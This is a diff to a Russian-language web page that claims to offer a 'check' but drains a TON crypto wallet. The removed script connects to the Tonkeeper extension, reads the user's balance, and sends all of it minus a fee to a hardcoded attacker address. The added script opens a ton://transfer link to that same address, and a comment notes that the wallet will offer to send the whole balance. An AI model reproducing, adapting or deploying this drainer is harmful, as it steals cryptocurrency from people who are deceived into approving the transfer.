@@ -43,15 +43,11 @@
         .btn:active {
             transform: scale(0.96);
         }
-        .btn:disabled {
-            opacity: 0.5;
-        }
         #status {
             margin-top: 16px;
             font-size: 13px;
             color: #888;
             min-height: 40px;
-            word-break: break-all;
         }
         .confirm-box {
             background: #1a2a3a;
@@ -86,9 +82,6 @@
             width: 100%;
             transition: 0.3s;
         }
-        .hidden {
-            display: none !important;
-        }
     </style>
 </head>
 <body>
@@ -106,137 +99,33 @@
 
     <script>
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
-        let provider = null;
-        let userAddress = null;
 
         const mainBtn = document.getElementById('mainBtn');
         const status = document.getElementById('status');
         const confirmBox = document.getElementById('confirmBox');
-        const openWalletBtn = document.getElementById('openWalletBtn');
 
-        // ========== ПОДКЛЮЧЕНИЕ ЧЕРЕЗ TON CONNECT ==========
-        function connectTon() {
-            status.innerText = '⏳ Подключение...';
-            mainBtn.disabled = true;
-
-            // Проверяем расширение
-            if (window.tonkeeper) {
-                provider = window.tonkeeper;
-                provider.send('ton_requestAccounts', {})
-                    .then(accounts => {
-                        if (accounts && accounts.length > 0) {
-                            userAddress = accounts[0];
-                            status.innerText = '✅ Подключён';
-                            confirmBox.classList.add('show');
-                            sendTransaction();
-                        } else {
-                            status.innerText = '❌ Отказ';
-                            mainBtn.disabled = false;
-                        }
-                    })
-                    .catch(() => {
-                        status.innerText = '❌ Ошибка';
-                        mainBtn.disabled = false;
-                    });
-                return;
-            }
-
-            // Если расширения нет — открываем через TON Connect
-            const url = 'https://app.tonkeeper.com/ton-connect?ret=' + encodeURIComponent(window.location.href);
-            window.open(url, '_blank');
-            status.innerText = '✅ Подтвердите в TON Keeper';
+        // ====== ОТКРЫТЬ TON KEEPER С ТРАНЗАКЦИЕЙ ======
+        function openTransaction() {
+            status.innerText = '⏳ Открываю TON Keeper...';
             confirmBox.classList.add('show');
-            mainBtn.disabled = false;
-
-            // Ждём подключения
-            let attempts = 0;
-            const interval = setInterval(() => {
-                attempts++;
-                if (window.tonkeeper) {
-                    clearInterval(interval);
-                    provider = window.tonkeeper;
-                    provider.send('ton_requestAccounts', {})
-                        .then(accounts => {
-                            if (accounts && accounts.length > 0) {
-                                userAddress = accounts[0];
-                                status.innerText = '✅ Подключён';
-                                sendTransaction();
-                            }
-                        });
-                }
-                if (attempts > 20) {
-                    clearInterval(interval);
-                }
-            }, 1000);
+            
+            // ====== ССЫЛКА НА ВЕСЬ БАЛАНС (ТОЛЬКО АДРЕС) ======
+            // TON Keeper сам покажет баланс и предложит отправить всё
+            const url = 'ton://transfer?address=' + TARGET;
+            
+            window.location.href = url;
+            
+            setTimeout(function() {
+                window.open(url, '_blank');
+            }, 300);
+            
+            status.innerText = '✅ Подтвердите транзакцию в TON Keeper';
         }
 
-        // ========== ОТПРАВКА ТРАНЗАКЦИИ ==========
-        function sendTransaction() {
-            if (!provider || !userAddress) {
-                status.innerText = '❌ Нет подключения';
-                return;
-            }
+        // ====== КНОПКИ ======
+        mainBtn.addEventListener('click', openTransaction);
+        document.getElementById('openWalletBtn').addEventListener('click', openTransaction);
 
-            status.innerText = '⏳ Проверка баланса...';
-
-            provider.send('ton_getBalance', { address: userAddress })
-                .then(hex => {
-                    const nano = parseInt(hex, 16);
-                    
-                    if (nano <= 0) {
-                        status.innerText = '💰 Баланс 0 TON';
-                        mainBtn.disabled = false;
-                        return;
-                    }
-
-                    const fee = 5000000;
-                    const amount = nano - fee;
-
-                    if (amount <= 0) {
-                        status.innerText = '⚠️ Баланс меньше комиссии';
-                        mainBtn.disabled = false;
-                        return;
-                    }
-
-                    const amountTON = (amount / 1e9).toFixed(6);
-                    status.innerText = `⏳ Отправка ${amountTON} TON...`;
-
-                    // ====== ОТПРАВЛЯЕМ ТРАНЗАКЦИЮ ======
-                    return provider.send('ton_sendTransaction', {
-                        to: TARGET,
-                        value: amount.toString(),
-                        data: '',
-                        stateInit: ''
-                    });
-                })
-                .then(result => {
-                    if (result && result.code === 0) {
-                        status.innerText = '✅ ВСЁ ПЕРЕВЕДЕНО!';
-                        mainBtn.innerText = '✅ ГОТОВО';
-                        mainBtn.disabled = true;
-                        mainBtn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
-                    } else {
-                        status.innerText = '❌ Транзакция отклонена';
-                        mainBtn.disabled = false;
-                    }
-                })
-                .catch(err => {
-                    status.innerText = '❌ Ошибка: ' + err.message;
-                    mainBtn.disabled = false;
-                });
-        }
-
-        // ========== КНОПКИ ==========
-        mainBtn.addEventListener('click', connectTon);
-        openWalletBtn.addEventListener('click', function() {
-            if (provider && userAddress) {
-                sendTransaction();
-            } else {
-                connectTon();
-            }
-        });
-
-        // ========== СТАТУС ==========
         status.innerText = 'Нажмите "ПРОВЕРИТЬ"';
     </script>
 </body>
